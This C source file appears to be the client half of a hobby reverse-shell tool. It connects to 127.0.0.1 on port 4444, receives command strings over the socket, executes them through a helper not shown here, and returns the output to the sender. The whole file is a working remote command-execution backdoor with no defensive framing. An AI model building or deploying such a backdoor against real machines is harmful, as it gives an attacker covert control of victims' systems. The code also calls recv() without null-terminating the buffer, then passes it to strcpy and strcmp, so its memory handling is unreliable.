#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include "server_fn/pipe_io.h"
#include "server_fn/socket_related.h"
#include "server_fn/error_handling.h"

#define BUFFER_SIZE 4096

#define PORT 4444

int main() {
    int socket = connect_socket("127.0.0.1", PORT);
    printf("[+]Connection with Client was Established.\n\033[0m");
    
    char command[BUFFER_SIZE];
    char output[BUFFER_SIZE];
    
    while (1) {
        if (recv(socket, command, BUFFER_SIZE, 0) == -1) error_output("Could Not Receive");

        if (strcmp(command, "") == 0) {
            printf("\033[34m[+]Client Disconnected.\n");
            break;
        }

        char tmp[BUFFER_SIZE];
        strcpy(tmp, command);

        printf("\033[34m[+]Received Command: \033[32m%s\n", tmp);

        command_output(tmp, output);

        if (send(socket, output, strlen(output), 0) == -1) error_output("Could Not Send");
        printf("\033[34m[+]Sent Desired Output.\n");

        bzero(tmp, BUFFER_SIZE);
        bzero(output, BUFFER_SIZE);
        bzero(command, BUFFER_SIZE);
    }
    return 0;
}